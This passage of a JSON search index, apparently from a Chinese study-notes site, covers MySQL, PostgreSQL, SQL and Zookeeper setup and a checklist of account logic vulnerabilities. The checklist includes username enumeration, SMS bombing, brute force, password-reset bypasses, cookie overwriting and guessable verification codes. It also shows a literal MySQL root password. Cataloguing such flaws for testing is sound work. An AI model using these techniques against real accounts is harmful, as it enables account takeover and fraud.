ALTER USER 'root'@'localhost' IDENTIFIED BY 'BloodZero@0';","title":"MySQL\u7684\u5b89\u88c5\u4e0e\u914d\u7f6e"},{"location":"study_notes/postgresql/","text":"PostgreSQL\u77e5\u8bc6\u4f53\u7cfb Centos7\u5b89\u88c5PostgreSQL # PostgreSQL yum\u6e90\u5730\u5740\uff1ahttps://yum.postgresql.org/ yum install postgresql.x86_64 postgresql-server.x86_64 postgresql-libs.x86_64 postgresql-jdbc.noarch postgresql-devel.x86_64 -y # \u5fc5\u987b\u5148\u521d\u59cb\u5316\u6570\u636e\u5e93\uff0c\u5982\u679c\u662f\u9ad8\u7248\u672c\uff0c\u9700\u8981\u627e\u5230\u6b63\u786e\u7684\u8def\u5f84 postgresql-setup initdb # \u542f\u52a8\u670d\u52a1 systemctl start postgresql.service PostgreSQL\u64cd\u4f5c # \u8fdb\u5165PostgreSQL\u4ea4\u4e92\u6a21\u5f0f su - postgres psql # \u521b\u5efa\u7528\u6237 create user username with password 'password'; # \u67e5\u770b\u6240\u6709\u7528\u6237 \\du # \u66f4\u6539\u5bc6\u7801 \\password username # \u5220\u9664\u7528\u6237 drop user username # \u4fee\u6539\u7528\u6237\u6743\u9650 alter role username login; # \u521b\u5efa\u6570\u636e\u5e93 create database db_name owner username; # \u67e5\u770b\u6240\u6709\u6570\u636e\u5e93 \\l # \u5207\u6362\u6570\u636e\u5e93 \\c db_name # \u67e5\u770b\u8868 \\d # \u67e5\u770b\u8868\u7ed3\u6784 \\d table_name \u53c2\u8003\u8d44\u6599 postgresql\u5e38\u7528\u64cd\u4f5c","title":"PostgreSQL\u77e5\u8bc6\u4f53\u7cfb"},{"location":"study_notes/postgresql/#postgresql","text":"","title":"PostgreSQL\u77e5\u8bc6\u4f53\u7cfb"},{"location":"study_notes/postgresql/#centos7postgresql","text":"# PostgreSQL yum\u6e90\u5730\u5740\uff1ahttps://yum.postgresql.org/ yum install postgresql.x86_64 postgresql-server.x86_64 postgresql-libs.x86_64 postgresql-jdbc.noarch postgresql-devel.x86_64 -y # \u5fc5\u987b\u5148\u521d\u59cb\u5316\u6570\u636e\u5e93\uff0c\u5982\u679c\u662f\u9ad8\u7248\u672c\uff0c\u9700\u8981\u627e\u5230\u6b63\u786e\u7684\u8def\u5f84 postgresql-setup initdb # \u542f\u52a8\u670d\u52a1 systemctl start postgresql.service","title":"Centos7\u5b89\u88c5PostgreSQL"},{"location":"study_notes/postgresql/#postgresql_1","text":"# \u8fdb\u5165PostgreSQL\u4ea4\u4e92\u6a21\u5f0f su - postgres psql # \u521b\u5efa\u7528\u6237 create user username with password 'password'; # \u67e5\u770b\u6240\u6709\u7528\u6237 \\du # \u66f4\u6539\u5bc6\u7801 \\password username # \u5220\u9664\u7528\u6237 drop user username # \u4fee\u6539\u7528\u6237\u6743\u9650 alter role username login; # \u521b\u5efa\u6570\u636e\u5e93 create database db_name owner username; # \u67e5\u770b\u6240\u6709\u6570\u636e\u5e93 \\l # \u5207\u6362\u6570\u636e\u5e93 \\c db_name # \u67e5\u770b\u8868 \\d # \u67e5\u770b\u8868\u7ed3\u6784 \\d table_name","title":"PostgreSQL\u64cd\u4f5c"},{"location":"study_notes/postgresql/#_1","text":"postgresql\u5e38\u7528\u64cd\u4f5c","title":"\u53c2\u8003\u8d44\u6599"},{"location":"study_notes/sql/","text":"SQL\u8bed\u53e5\u77e5\u8bc6\u4f53\u7cfb # \u6570\u636e\u5e93\u8fde\u63a5 mysql -h host -P port -u username -ppassword \u5e38\u7528SQL\u96e8\u5177 # \u521b\u5efa\u7528\u6237 create user username identified by password ; insert into mysql.user(User,Password) values('username',password('password')); # \u5237\u65b0\u6743\u9650 flush privileges; # \u67e5\u770b\u7528\u6237\u6743\u9650 show grants for db_user@host; # \u8d4b\u4e88\u7528\u6237\u6743\u9650 grant all privileges on db_name.table_name to 'db_user'@'host' identified by 'password'; # \u6536\u56de\u7528\u6237\u6743\u9650 # \u521b\u5efa\u6570\u636e\u5e93 create database db_name CHARACTER set utf8 COLLATE utf8_general_ci; # \u5220\u9664\u6570\u636e\u5e93 drop database db_name; # \u67e5\u770b\u6570\u636e\u5e93 show databases; # \u521b\u5efa\u8868 create table table_name(column_name type); create table if not exists; create table table_name select * from oldtable_name; create table table_name select * from oldtable_name where 0=1; create temporary table table_name; # \u521b\u5efa\u4e34\u65f6\u8868 # \u67e5\u770b\u8868\u7ed3\u6784 desc table_name; # \u91cd\u547d\u540d\u8868 alter table_name rename newtable_name; # \u5220\u9664\u8868 drop table table_name; drop table if exists table_name; # \u6dfb\u52a0\u5b57\u6bb5 alter table table_name add column_name type; # \u5220\u9664\u5b57\u6bb5 alter table table_name del column_name; # \u4fee\u6539\u5b57\u6bb5\u5c5e\u6027 alter table table_name modify column_name new_type; # \u4fee\u6539\u5b57\u6bb5\u540d\u79f0\u4e0e\u5c5e\u6027 alter table table_name change column oldcolumn_name newcolumn_name type; # \u5c06\u65f6\u95f4\u6233\u8f6c\u6362\u4e3a\u65e5\u671f select FROM_UNIXTIME(1551422203); # \u5c06\u65e5\u671f\u8f6c\u6362\u4e3a\u65f6\u95f4\u6233 select UNIX_TIMESTAMP('2019-03-01 13:44:00'); # \u8bbe\u7f6e\u5b57\u6bb5\u4e3a\u7a7a update table_name set column_name is null; update table_name set column_name=NULL;","title":"SQL\u8bed\u53e5\u77e5\u8bc6\u4f53\u7cfb"},{"location":"study_notes/sql/#sql","text":"# \u6570\u636e\u5e93\u8fde\u63a5 mysql -h host -P port -u username -ppassword \u5e38\u7528SQL\u96e8\u5177 # \u521b\u5efa\u7528\u6237 create user username identified by password ; insert into mysql.user(User,Password) values('username',password('password')); # \u5237\u65b0\u6743\u9650 flush privileges; # \u67e5\u770b\u7528\u6237\u6743\u9650 show grants for db_user@host; # \u8d4b\u4e88\u7528\u6237\u6743\u9650 grant all privileges on db_name.table_name to 'db_user'@'host' identified by 'password'; # \u6536\u56de\u7528\u6237\u6743\u9650 # \u521b\u5efa\u6570\u636e\u5e93 create database db_name CHARACTER set utf8 COLLATE utf8_general_ci; # \u5220\u9664\u6570\u636e\u5e93 drop database db_name; # \u67e5\u770b\u6570\u636e\u5e93 show databases; # \u521b\u5efa\u8868 create table table_name(column_name type); create table if not exists; create table table_name select * from oldtable_name; create table table_name select * from oldtable_name where 0=1; create temporary table table_name; # \u521b\u5efa\u4e34\u65f6\u8868 # \u67e5\u770b\u8868\u7ed3\u6784 desc table_name; # \u91cd\u547d\u540d\u8868 alter table_name rename newtable_name; # \u5220\u9664\u8868 drop table table_name; drop table if exists table_name; # \u6dfb\u52a0\u5b57\u6bb5 alter table table_name add column_name type; # \u5220\u9664\u5b57\u6bb5 alter table table_name del column_name; # \u4fee\u6539\u5b57\u6bb5\u5c5e\u6027 alter table table_name modify column_name new_type; # \u4fee\u6539\u5b57\u6bb5\u540d\u79f0\u4e0e\u5c5e\u6027 alter table table_name change column oldcolumn_name newcolumn_name type; # \u5c06\u65f6\u95f4\u6233\u8f6c\u6362\u4e3a\u65e5\u671f select FROM_UNIXTIME(1551422203); # \u5c06\u65e5\u671f\u8f6c\u6362\u4e3a\u65f6\u95f4\u6233 select UNIX_TIMESTAMP('2019-03-01 13:44:00'); # \u8bbe\u7f6e\u5b57\u6bb5\u4e3a\u7a7a update table_name set column_name is null; update table_name set column_name=NULL;","title":"SQL\u8bed\u53e5\u77e5\u8bc6\u4f53\u7cfb"},{"location":"study_notes/zookeeper/","text":"Zookeeper\u77e5\u8bc6\u4f53\u7cfb Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eZookeeper Zookeeper\u4e0b\u8f7d\u5730\u5740\uff1ahttp://mirror.bit.edu.cn/apache/zookeeper/ # \u4f7f\u7528yum\u5b89\u88c5java\u73af\u5883 yum install java-1.8.0-openjdk.x86_64 java-1.8.0-openjdk-devel.x86_64 -y # \u4e0b\u8f7d\u5e76\u89e3\u538bZookeeper\uff0c\u5e76\u79fb\u52a8\u5230\u5408\u7406\u5230\u4f4d\u7f6e tar -xf apache-zookeeper-3.5.5-bin.tar.gz mv apache-zookeeper-3.5.5-bin /opt/zookeeper3.5.5 # \u914d\u7f6e\u7cfb\u7edf\u73af\u5883\u53d8\u91cf echo export ZOOKEEPER_HOME=/opt/zookeeper3.5.5 /etc/profile echo export PATH=$PATH:$ZOOKEEPER_HOME/bin /etc/profile source /etc/profile \u914d\u7f6eZookeeper # \u590d\u5236\u914d\u7f6e\u6587\u4ef6 cp /opt/zookeeper3.5.5/conf/zoo_sample.cfg /opt/zookeeper3.5.5/conf/zoo.cfg # \u4fee\u6539\u914d\u7f6e\u6587\u4ef6 vim /opt/zookeeper3.5.5/conf/zoo.cfg # tickTime=2000 # initLimit=10 # syncLimit=5 # dataDir=/tmp/zookeeper # clientPort=2181 \u542f\u52a8Zookeeper zkServer.sh start Zookeeper\u5ba2\u6237\u7aef # \u542f\u52a8\u5ba2\u6237\u7aef zkCli.sh # \u4ee5\u4e0b\u64cd\u4f5c\u5728\u5ba2\u6237\u7aef\u4ea4\u4e92\u7a97\u53e3\u4e2d\u6267\u884c h:\u67e5\u770b\u5e2e\u52a9 ls /:\u67e5\u770b\u6839\u76ee\u5f55\u8282\u70b9 stat /:\u67e5\u770b\u6839\u8282\u70b9\u72b6\u6001 get /:\u67e5\u770b\u6839\u8282\u70b9\u6570\u636e\u548c\u8be6\u60c5 quit:\u9000\u51fa","title":"Zookeeper\u77e5\u8bc6\u4f53\u7cfb"},{"location":"study_notes/zookeeper/#zookeeper","text":"","title":"Zookeeper\u77e5\u8bc6\u4f53\u7cfb"},{"location":"study_notes/zookeeper/#centos7zookeeper","text":"Zookeeper\u4e0b\u8f7d\u5730\u5740\uff1ahttp://mirror.bit.edu.cn/apache/zookeeper/ # \u4f7f\u7528yum\u5b89\u88c5java\u73af\u5883 yum install java-1.8.0-openjdk.x86_64 java-1.8.0-openjdk-devel.x86_64 -y # \u4e0b\u8f7d\u5e76\u89e3\u538bZookeeper\uff0c\u5e76\u79fb\u52a8\u5230\u5408\u7406\u5230\u4f4d\u7f6e tar -xf apache-zookeeper-3.5.5-bin.tar.gz mv apache-zookeeper-3.5.5-bin /opt/zookeeper3.5.5 # \u914d\u7f6e\u7cfb\u7edf\u73af\u5883\u53d8\u91cf echo export ZOOKEEPER_HOME=/opt/zookeeper3.5.5 /etc/profile echo export PATH=$PATH:$ZOOKEEPER_HOME/bin /etc/profile source /etc/profile","title":"Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eZookeeper"},{"location":"study_notes/zookeeper/#zookeeper_1","text":"# \u590d\u5236\u914d\u7f6e\u6587\u4ef6 cp /opt/zookeeper3.5.5/conf/zoo_sample.cfg /opt/zookeeper3.5.5/conf/zoo.cfg # \u4fee\u6539\u914d\u7f6e\u6587\u4ef6 vim /opt/zookeeper3.5.5/conf/zoo.cfg # tickTime=2000 # initLimit=10 # syncLimit=5 # dataDir=/tmp/zookeeper # clientPort=2181","title":"\u914d\u7f6eZookeeper"},{"location":"study_notes/zookeeper/#zookeeper_2","text":"zkServer.sh start","title":"\u542f\u52a8Zookeeper"},{"location":"study_notes/zookeeper/#zookeeper_3","text":"# \u542f\u52a8\u5ba2\u6237\u7aef zkCli.sh # \u4ee5\u4e0b\u64cd\u4f5c\u5728\u5ba2\u6237\u7aef\u4ea4\u4e92\u7a97\u53e3\u4e2d\u6267\u884c h:\u67e5\u770b\u5e2e\u52a9 ls /:\u67e5\u770b\u6839\u76ee\u5f55\u8282\u70b9 stat /:\u67e5\u770b\u6839\u8282\u70b9\u72b6\u6001 get /:\u67e5\u770b\u6839\u8282\u70b9\u6570\u636e\u548c\u8be6\u60c5 quit:\u9000\u51fa","title":"Zookeeper\u5ba2\u6237\u7aef"},{"location":"vulnerability/account/","text":"\u8d26\u6237\u903b\u8f91\u6f0f\u6d1e \u8d26\u6237\u901a\u7528\u6f0f\u6d1e \u6d17\u53f7 \u5229\u7528\"\u5224\u65ad\u7528\u6237\u662f\u5426\u5b58\u5728\u63a5\u53e3\"\uff0c\u901a\u8fc7\u5e02\u9762\u4e0a\u7684\u6cc4\u6f0f\u4fe1\u606f\u6216\u901a\u8fc7\u7528\u6237\u540d\u89c4\u5219\u6784\u9020\u83b7\u53d6\u7cfb\u7edf\u771f\u5b9e\u7528\u6237\u4fe1\u606f\u3002\u83b7\u53d6\u5230\u7528\u6237\u4fe1\u606f\u540e\u53ef\u4ee5\u8fdb\u884c\u66b4\u529b\u7834\u89e3\u6216\u8005\u8fdb\u884c\u9493\u9c7c\u653b\u51fb\u3002 \u70b8\u5f39\u653b\u51fb \u77ed\u4fe1\u70b8\u5f39\uff1a\u77ed\u4fe1\u6210\u672c\uff1b\u7528\u6237\u6295\u8bc9\u540e\u5bf9\u4f01\u4e1a\u4fe1\u8a89\u7684\u5f71\u54cd\u3002 \u90ae\u4ef6\u70b8\u5f39\uff1a\u964d\u4f4e\u53d1\u4ef6\u90ae\u7bb1\u7684\u4fe1\u8a89\u5ea6\uff08\u5f88\u96be\u4e0a\u6da8\uff09\u3002 \u4f20\u9012\u7528\u6237\u4fe1\u606f\u8bf7\u6c42\u672a\u4f7f\u7528https \u6ce8\u518c\u573a\u666f\u6f0f\u6d1e \u5783\u573e/\u6279\u91cf\u6ce8\u518c \u901a\u8fc7\u7a0b\u5e8f\u6216\u4eba\u529b\u6ce8\u518c\u5927\u91cf\u7684\u975e\u6d3b\u8dc3\u7528\u6237\uff0c\u8fd9\u4e9b\u7528\u6237\u4e0d\u80fd\u7ed9\u4f01\u4e1a\u5e26\u6765\u6536\u76ca\uff0c\u5374\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u589e\u52a0\u4e86\u4f01\u4e1a\u7684\u8fd0\u8425\u6210\u672c\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u8fd9\u4e9b\u7528\u6237\u53ef\u80fd\u7ed9\u7528\u6237\u5e26\u6765\u90e8\u5206\u6536\u76ca\uff0c\u6bd4\u5982\uff1a\u6d3b\u52a8\u4f18\u60e0\u3001\u5237\u5355\u7b49\u7b49\u3002 \u624b\u673a\u5899\u771f\u4eba\u64cd\u4f5c\uff1a \u811a\u672c\u6279\u91cf\u6ce8\u518c\uff1a \u6a21\u62df\u5668\u6ce8\u518c\uff1a \u4efb\u610f\u8d26\u53f7\u6ce8\u518c \u4e0d\u6821\u9a8c\u7528\u6237\u4fe1\u606f\uff08\u53ea\u9700\u8981\u7528\u6237\u8f93\u5165\u624b\u673a\u53f7\u6216\u90ae\u7bb1\u5373\u53ef\u6ce8\u518c\u6210\u529f\uff09\uff1b \u7528\u6237\u4fe1\u606f\u4e0e\u6821\u9a8c\u51ed\u8bc1\u672a\u7ed1\u5b9a\uff1b \u6ce8\u518c\u8986\u76d6\u539f\u6709\u7528\u6237 \u4f4e\u7248\u672c\u7684MySQL\u53ef\u4ee5\u590d\u73b0 \u8d26\u6237\uff1azhangsan \u4e0e zhangsan (zhangsan\u540e\u9762\u6709N\u4e2a\u7a7a\u683c) \u4e24\u4e2a\u8d26\u6237\u5728\u6570\u636e\u5e93\u4e2d\u8868\u73b0\u4e3a\u540c\u4e00\u4e2a\u8d26\u6237\u3002 \u767b\u5f55\u573a\u666f\u6f0f\u6d1e \u767b\u5f55\u6587\u6848\u6f0f\u6d1e \u767b\u5f55\u9519\u8bef\u63d0\u793a\u8fc7\u4e8e\u6e05\u6670\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u66f4\u65b9\u4fbf\u653b\u51fb\u7528\u6237\u3002 \u767b\u5f55\u524d\u7aef\u6821\u9a8c \u6821\u9a8c\u7ed3\u679c\u53ef\u63a7\u3002 \u66b4\u529b\u7834\u89e3 \u901a\u8fc7\u6d17\u53f7\u83b7\u53d6\u7528\u6237\u4fe1\u606f\uff0c\u91c7\u7528\u5b57\u5178\u7684\u5f62\u5f0f\u5bf9\u7528\u6237\u7684\u5bc6\u7801\u8fdb\u884c\u66b4\u529b\u731c\u89e3\u3002 \u4e0d\u5b58\u5728\u4efb\u4f55\u5176\u5b83\u7684\u5b89\u5168\u9632\u62a4\u63aa\u65bd\uff1b \u5b58\u5728\u9a8c\u8bc1\u7801\uff1a\u9a8c\u8bc1\u7801\u7684\u903b\u8f91\u6f0f\u6d1e\u5bfc\u81f4\u7684\u66b4\u529b\u7834\u89e3\uff1b \u6076\u610f\u9501\u5b9a \u5bc6\u7801\u9519\u8bef\u591a\u6b21\u540e\u9501\u5b9a\u8d26\u6237\uff0c\u9700\u8981\u901a\u8fc7\u4eba\u5de5\u624b\u6bb5\u89e3\u9501\u3002 session\u4e0ecookie\u95ee\u9898 \u7528\u6237\u6bcf\u6b21\u767b\u5f55\u7684session\u6216cookie\u662f\u552f\u4e00\u7684\u4e00\u4e2a\u503c\uff1b \u7528\u6237\u9000\u51fa\u767b\u5f55\uff0c\u4f46\u662fsession\u6216cookie\u4e0d\u5931\u6548\uff1b session\u4f1a\u8bdd\u5b58\u6d3b\u65f6\u95f4\u8fc7\u957f\uff1b session\u6216cookie\u7ed3\u6784\u592a\u7b80\u5355\uff0c\u5bb9\u6613\u88ab\u4f2a\u9020\uff1b \u5782\u76f4\u8d8a\u6743\u8bbf\u95ee\u540e\u53f0\u9875\u9762 \u540e\u53f0\u90e8\u5206\u9875\u9762\u4e0d\u9700\u8981\u7ecf\u8fc7\u9274\u6743\u5373\u53ef\u767b\u5f55\u3002 \u627e\u56de\u5bc6\u7801\u903b\u8f91\u9519\u8bef \u8f93\u5165\u7528\u6237\u4fe1\u606f \u83b7\u53d6\u7528\u6237\u51ed\u8bc1\uff0c\u5e76\u4e14\u6821\u9a8c\u7528\u6237\u51ed\u8bc1 \u91cd\u7f6e\u5bc6\u7801 \u91cd\u7f6e\u6210\u529f\u767b\u5f55 \u524d\u7aef\u6821\u9a8c\u51ed\u8bc1 \u6821\u9a8c\u7ed3\u679c\u53ef\u63a7\u4ece\u800c\u5bfc\u81f4\u4efb\u610f\u8d26\u53f7\u5bc6\u7801\u91cd\u7f6e\u3002 \u627e\u56de\u5bc6\u7801\u51ed\u8bc1\u66b4\u529b\u7834\u89e3 \u653b\u51fb\u8005\u5728\u6821\u9a8c\u7528\u6237\u51ed\u8bc1\u65f6\uff0c\u7531\u4e8e\u51ed\u8bc1\u8fc7\u4e8e\u7b80\u5355\u6216\u8005\u5931\u6548\u65f6\u95f4\u8fc7\u957f\u751a\u81f3\u4e0d\u5931\u6548\u7684\u95ee\u9898\u4ece\u800c\u5bf9\u51ed\u8bc1\u8fdb\u884c\u66b4\u529b\u7834\u89e3\u3002 \u51ed\u8bc1\u8fd4\u56de\u9519\u8bef \u51ed\u8bc1\u4fe1\u606f\u8fd4\u56de\u5728response\u7684\u6570\u636e\u5305\u4e2d\uff0c\u6216\u8005\u76f4\u63a5\u4ee5URL\u7684\u5f62\u5f0f\u8fd4\u56de\u3002 \u51ed\u8bc1\u4fe1\u606f\u4e0e\u7528\u6237\u4fe1\u606f\u4e0d\u7ed1\u5b9a \u7531\u4e8e\u51ed\u8bc1\u672a\u4e0e\u7528\u6237\u4fe1\u606f\u7ed1\u5b9a\uff0c\u5bfc\u81f4\u53ef\u4ee5\u7528B\u7528\u6237\u7684\u51ed\u8bc1\u4fe1\u606f\u6765\u6821\u9a8cA\u7528\u6237\uff0c\u4ece\u800c\u5bfc\u81f4B\u91cd\u7f6e\u4e86A\u7528\u6237\u7684\u5bc6\u7801\u3002 \u90ae\u7bb1\u91cd\u7f6e\u5bc6\u7801\u5bb9\u6613\u51fa\u73b0\u5f31token unix\u65f6\u95f4\u6233token\uff1b \u7528\u6237\u540d\u6216\u8005\u7528\u6237\u540d+\u5176\u5b83\u4fe1\u606f\u751f\u6210\u7684token\uff1b \u4f7f\u7528md5\u6216\u8005base64\u7f16\u7801\u751f\u6210\u7684token\uff1b Cookie\u8986\u76d6 \u5728A\u7528\u6237\u91cd\u7f6e\u5bc6\u7801\u8fdb\u884c\u5230\u7b2c\u4e09\u6b65\u65f6\uff0c\u4e0d\u5173\u95ed\u9875\u9762\uff1b \u65b0\u5efa\u4e00\u4e2atab\u9875\u9762\uff0c\u91cd\u7f6eB\u7528\u6237\u7684\u5bc6\u7801\uff0c\u8fdb\u884c\u5230\u7b2c\u4e8c\u6b65\uff0c\u4e5f\u4e0d\u8981\u5173\u95ed\u9875\u9762\uff1b \u5237\u65b0\u7b2c\u4e00\u4e2a\u9875\u9762\uff0c\u8fd9\u4e2a\u65f6\u5019\u9875\u9762\u4e0a\u663e\u793a\u91cd\u7f6e\u7684\u5c31\u662fB\u7528\u6237\u7684\u5bc6\u7801\uff0c\u4ece\u800c\u8fbe\u5230A\u7528\u6237\u91cd\u7f6e\u4e86B\u7528\u6237\u7684\u5bc6\u7801\uff1b \u627e\u56de\u6b65\u9aa4\u4e0a\u4e0b\u6587\u8d8a\u6743 \u76f4\u63a5\u8df3\u8fc7\u7b2c\u4e8c\u6b65\u6821\u9a8c\u7528\u6237\u4e0e\u51ed\u8bc1\u7684\u8fc7\u7a0b\u3002 \u4e07\u80fd\u6821\u9a8c\u7801 000000 111111 666666 888888 \u8d8a\u6743\u4fee\u6539\u3001\u67e5\u770b\u3001\u5220\u9664\u7528\u6237\u4fe1\u606f\u6f0f\u6d1e \u5b9e\u540d\u8ba4\u8bc1\u6f0f\u6d1e \u4ec5\u8fdb\u884c\u59d3\u540d\u57df\u8eab\u4efd\u8bc1\u53f7\u6838\u5bf9\uff1a\u6700\u57fa\u7840\u7684\u8ba4\u8bc1\u624b\u6bb5\uff0c\u7531\u4e8e\u5927\u91cf\u7684\u8eab\u4efd\u4fe1\u606f\u6cc4\u6f0f\uff0c\u6b64\u79cd\u9a8c\u8bc1\u5df2\u7ecf\u4e0d\u5177\u5907\u4ec0\u4e48\u610f\u4e49\u4e86\u3002 \u8eab\u4efd\u8bc1\u56fe\u7247\u4e0a\u6b21\u6838\u5bf9\uff1a\u5355\u4e00\u4e0a\u6b21\u8eab\u4efd\u8bc1\u7167\u7247\u6ca1\u6709\u4ec0\u4e48\u5927\u7528\uff0c\u53cd\u800c\u5bb9\u6613\u9020\u6210\u56fe\u7247\u4fe1\u606f\u6cc4\u6f0f\u3002\u9700\u8981\u901a\u8fc7\u5176\u5b83\u8f85\u52a9\u624b\u6bb5\u6765\u9a8c\u8bc1\u56fe\u7247\u7684\u771f\u5b9e\u6027\u3002 \u94f6\u884c\u5361\u7ed1\u5b9a\u6838\u5bf9\uff1a\u76f8\u5bf9\u800c\u8a00\u5b89\u5168\u7b49\u7ea7\u8f83\u9ad8\uff0c\u4f46\u662f\u76ee\u524d\u9ed1\u5e02\u4e0a\u6709\u6210\u5957\u7684\u7528\u6237\u4fe1\u606f\u51fa\u552e\uff0c\u5305\u62ec\uff1a\u8eab\u4efd\u8bc1\u3001\u94f6\u884c\u5361\u3001\u7167\u7247\u7b49\u4fe1\u606f\u3002 \u4eba\u8138\u8bc6\u522b\u6838\u5bf9\uff1a\u4eba\u8138\u8bc6\u522b\u7cbe\u5ea6\u8f83\u4f4e\uff1b\u5229\u7528\u4fee\u56fe\u6280\u672f\u7ed5\u8fc7\u4eba\u8138\u8bc6\u522b\uff1b\u76f8\u50cf\u7684\u4eba\u53ef\u4ee5\u7ed5\u8fc7\u4eba\u8138\u8bc6\u522b\u3002","title":"\u8d26\u6237\u903b\u8f91\u6f0f\u6d1e"},{"location":"vulnerability/account/#_1","text":"","title":"\u8d26\u6237\u903b\u8f91\u6f0f\u6d1e"},{"location":"vulnerability/account/#_2","text":"","title":"\u8d26\u6237\u901a\u7528\u6f0f\u6d1e"},{"location":"vulnerability/account/#_3","text":"\u5229\u7528\"\u5224\u65ad\u7528\u6237\u662f\u5426\u5b58\u5728\u63a5\u53e3\"\uff0c\u901a\u8fc7\u5e02\u9762\u4e0a\u7684\u6cc4\u6f0f\u4fe1\u606f\u6216\u901a\u8fc7\u7528\u6237\u540d\u89c4\u5219\u6784\u9020\u83b7\u53d6\u7cfb\u7edf\u771f\u5b9e\u7528\u6237\u4fe1\u606f\u3002\u83b7\u53d6\u5230\u7528\u6237\u4fe1\u606f\u540e\u53ef\u4ee5\u8fdb\u884c\u66b4\u529b\u7834\u89e3\u6216\u8005\u8fdb\u884c\u9493\u9c7c\u653b\u51fb\u3002","title":"\u6d17\u53f7"},{"location":"vulnerability/account/#_4","text":"\u77ed\u4fe1\u70b8\u5f39\uff1a\u77ed\u4fe1\u6210\u672c\uff1b\u7528\u6237\u6295\u8bc9\u540e\u5bf9\u4f01\u4e1a\u4fe1\u8a89\u7684\u5f71\u54cd\u3002 \u90ae\u4ef6\u70b8\u5f39\uff1a\u964d\u4f4e\u53d1\u4ef6\u90ae\u7bb1\u7684\u4fe1\u8a89\u5ea6\uff08\u5f88\u96be\u4e0a\u6da8\uff09\u3002","title":"\u70b8\u5f39\u653b\u51fb"},{"location":"vulnerability/account/#https","text":"","title":"\u4f20\u9012\u7528\u6237\u4fe1\u606f\u8bf7\u6c42\u672a\u4f7f\u7528https"},{"location":"vulnerability/account/#_5","text":"","title":"\u6ce8\u518c\u573a\u666f\u6f0f\u6d1e"},{"location":"vulnerability/account/#_6","text":"\u901a\u8fc7\u7a0b\u5e8f\u6216\u4eba\u529b\u6ce8\u518c\u5927\u91cf\u7684\u975e\u6d3b\u8dc3\u7528\u6237\uff0c\u8fd9\u4e9b\u7528\u6237\u4e0d\u80fd\u7ed9\u4f01\u4e1a\u5e26\u6765\u6536\u76ca\uff0c\u5374\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u589e\u52a0\u4e86\u4f01\u4e1a\u7684\u8fd0\u8425\u6210\u672c\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u8fd9\u4e9b\u7528\u6237\u53ef\u80fd\u7ed9\u7528\u6237\u5e26\u6765\u90e8\u5206\u6536\u76ca\uff0c\u6bd4\u5982\uff1a\u6d3b\u52a8\u4f18\u60e0\u3001\u5237\u5355\u7b49\u7b49\u3002 \u624b\u673a\u5899\u771f\u4eba\u64cd\u4f5c\uff1a \u811a\u672c\u6279\u91cf\u6ce8\u518c\uff1a \u6a21\u62df\u5668\u6ce8\u518c\uff1a","title":"\u5783\u573e/\u6279\u91cf\u6ce8\u518c"},{"location":"vulnerability/account/#_7","text":"\u4e0d\u6821\u9a8c\u7528\u6237\u4fe1\u606f\uff08\u53ea\u9700\u8981\u7528\u6237\u8f93\u5165\u624b\u673a\u53f7\u6216\u90ae\u7bb1\u5373\u53ef\u6ce8\u518c\u6210\u529f\uff09\uff1b \u7528\u6237\u4fe1\u606f\u4e0e\u6821\u9a8c\u51ed\u8bc1\u672a\u7ed1\u5b9a\uff1b","title":"\u4efb\u610f\u8d26\u53f7\u6ce8\u518c"},{"location":"vulnerability/account/#_8","text":"\u4f4e\u7248\u672c\u7684MySQL\u53ef\u4ee5\u590d\u73b0 \u8d26\u6237\uff1azhangsan \u4e0e zhangsan (zhangsan\u540e\u9762\u6709N\u4e2a\u7a7a\u683c) \u4e24\u4e2a\u8d26\u6237\u5728\u6570\u636e\u5e93\u4e2d\u8868\u73b0\u4e3a\u540c\u4e00\u4e2a\u8d26\u6237\u3002","title":"\u6ce8\u518c\u8986\u76d6\u539f\u6709\u7528\u6237"},{"location":"vulnerability/account/#_9","text":"","title":"\u767b\u5f55\u573a\u666f\u6f0f\u6d1e"},{"location":"vulnerability/account/#_10","text":"\u767b\u5f55\u9519\u8bef\u63d0\u793a\u8fc7\u4e8e\u6e05\u6670\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u66f4\u65b9\u4fbf\u653b\u51fb\u7528\u6237\u3002","title":"\u767b\u5f55\u6587\u6848\u6f0f\u6d1e"},{"location":"vulnerability/account/#_11","text":"\u6821\u9a8c\u7ed3\u679c\u53ef\u63a7\u3002","title":"\u767b\u5f55\u524d\u7aef\u6821\u9a8c"},{"location":"vulnerability/account/#_12","text":"\u901a\u8fc7\u6d17\u53f7\u83b7\u53d6\u7528\u6237\u4fe1\u606f\uff0c\u91c7\u7528\u5b57\u5178\u7684\u5f62\u5f0f\u5bf9\u7528\u6237\u7684\u5bc6\u7801\u8fdb\u884c\u66b4\u529b\u731c\u89e3\u3002 \u4e0d\u5b58\u5728\u4efb\u4f55\u5176\u5b83\u7684\u5b89\u5168\u9632\u62a4\u63aa\u65bd\uff1b \u5b58\u5728\u9a8c\u8bc1\u7801\uff1a\u9a8c\u8bc1\u7801\u7684\u903b\u8f91\u6f0f\u6d1e\u5bfc\u81f4\u7684\u66b4\u529b\u7834\u89e3\uff1b","title":"\u66b4\u529b\u7834\u89e3"},{"location":"vulnerability/account/#_13","text":"\u5bc6\u7801\u9519\u8bef\u591a\u6b21\u540e\u9501\u5b9a\u8d26\u6237\uff0c\u9700\u8981\u901a\u8fc7\u4eba\u5de5\u624b\u6bb5\u89e3\u9501\u3002","title":"\u6076\u610f\u9501\u5b9a"},{"location":"vulnerability/account/#sessioncookie","text":"\u7528\u6237\u6bcf\u6b21\u767b\u5f55\u7684session\u6216cookie\u662f\u552f\u4e00\u7684\u4e00\u4e2a\u503c\uff1b \u7528\u6237\u9000\u51fa\u767b\u5f55\uff0c\u4f46\u662fsession\u6216cookie\u4e0d\u5931\u6548\uff1b session\u4f1a\u8bdd\u5b58\u6d3b\u65f6\u95f4\u8fc7\u957f\uff1b 